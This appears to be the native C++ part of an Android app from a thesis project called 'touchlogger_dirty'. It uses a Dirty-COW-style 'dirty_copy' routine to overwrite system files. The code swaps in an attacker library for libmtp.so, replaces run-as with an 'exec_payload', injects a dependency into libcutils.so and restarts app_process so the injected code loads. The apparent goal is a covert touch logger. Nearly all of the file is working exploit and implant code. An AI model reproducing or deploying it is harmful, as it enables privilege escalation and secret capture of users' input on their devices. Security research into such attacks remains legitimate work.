#include <jni.h>
#include <string>
#include <android/log.h>
#include <stdlib.h>




#include "libdirty/dirty_copy.h"
#include "libdirty/dirty_inject.h"

#define MYLOG(...) __android_log_print(ANDROID_LOG_WARN, "tldirty", __VA_ARGS__)

#define APP_PROCESS_PATH "/system/bin/app_process32"
#define LIBCUTILS_PATH "/system/lib/libcutils.so"
#define LIBMTP_PATH "/system/lib/libmtp.so"
#define RUN_AS_PATH "/system/bin/run-as"

extern "C"
JNIEXPORT void JNICALL
Java_org_leyfer_thesis_touchlogger_1dirty_activity_MainActivity_injectConstructor(JNIEnv *env, jclass type,
                                                                          jstring srcPath_, jstring localPath_) {
  const char *srcPath = env->GetStringUTFChars(srcPath_, 0);
  const char* localPath = env->GetStringUTFChars(localPath_, 0);

  char* app_process_local_path = new char[PATH_MAX];
  snprintf(app_process_local_path, PATH_MAX, "%s/%s", localPath, "app_process.bak");

  char* libcutils_local_path = new char[PATH_MAX];
  snprintf(libcutils_local_path, PATH_MAX, "%s/%s", localPath, "libcutils.so.bak");

  char* libmtp_local_path = new char[PATH_MAX];
  snprintf(libmtp_local_path, PATH_MAX, "%s/%s", localPath, "libmtp.so.bak");

  char* run_as_local_path = new char[PATH_MAX];
  snprintf(run_as_local_path , PATH_MAX, "%s/%s", localPath, "exec_payload");

  struct stat st;

  int f = open(srcPath, O_RDONLY);
  if (f == -1) {
    MYLOG("could not open %s", srcPath);
  }
  if (fstat(f, &st) == -1) {
    MYLOG("could not stat %s", srcPath);
  }

  MYLOG("Size: %llu", st.st_size);
  close(f);

  MYLOG("About to dirty_copy!");
  copy_file(LIBMTP_PATH, libmtp_local_path);
  dirty_copy(srcPath, LIBMTP_PATH);

  MYLOG("About to replace run_as!");
  dirty_copy(run_as_local_path, RUN_AS_PATH);
  MYLOG("Done!");

  MYLOG("About to inject_dependency_into_library!");
  copy_file(LIBCUTILS_PATH, libcutils_local_path);
  inject_dependency_into_library(LIBCUTILS_PATH, "libmtp.so");
  MYLOG("About to replace_dependency_in_binary!");
  // TEMP WORKAROUND FOR NEXUS 5, DON'T COMMIT!
  replace_dependency_in_binary(LIBCUTILS_PATH, "libcutils.so", "libmtp.so");

  sleep(5);
  if (!fork())
  {
    if (daemon(0, 0) == -1) {
      MYLOG("Unable to daemonize: %s!", strerror(errno));
    }

    MYLOG("About to kill app_process!");
    copy_file(APP_PROCESS_PATH, app_process_local_path);

    if (daemon(0, 0) == -1) {
      MYLOG("Unable to daemonize: %s!", strerror(errno));
    }

    int app_killer_pid;
    if (!(app_killer_pid = fork())) {
      dirty_copy(srcPath, APP_PROCESS_PATH);
      exit(0);
    } else {
      sleep(5);
    }

    MYLOG("Wait for it...");
    sleep(5);
    kill(app_killer_pid, SIGKILL);
    MYLOG("Done! About to resurrect it");
    dirty_copy(app_process_local_path, APP_PROCESS_PATH);
    MYLOG("Done!");
    sleep(10);

    MYLOG("Return everything to initial state");

    if (!(app_killer_pid = fork())) {
      dirty_copy(srcPath, APP_PROCESS_PATH);
      exit(0);
    } else {
      sleep(5);
    }

    MYLOG("Wait for it...");
    sleep(5);

    kill(app_killer_pid, SIGKILL);
    MYLOG("Done! About to resurrect it");

    dirty_copy(libmtp_local_path, LIBMTP_PATH);
    dirty_copy(libcutils_local_path, LIBCUTILS_PATH);
    dirty_copy(app_process_local_path, APP_PROCESS_PATH);
    MYLOG("Done!");

    exit(0);
  }

  free(app_process_local_path);
  free(libcutils_local_path);
  free(libmtp_local_path);

  env->ReleaseStringUTFChars(srcPath_, srcPath);
  env->ReleaseStringUTFChars(localPath_, localPath);
}

extern "C"
JNIEXPORT jstring JNICALL
Java_org_leyfer_thesis_touchlogger_1dirty_activity_MainActivity_stringFromJNI(JNIEnv *env,
                                                                              jobject instance) {
  std::string hello = "Hello from C++";
  return env->NewStringUTF(hello.c_str());
}
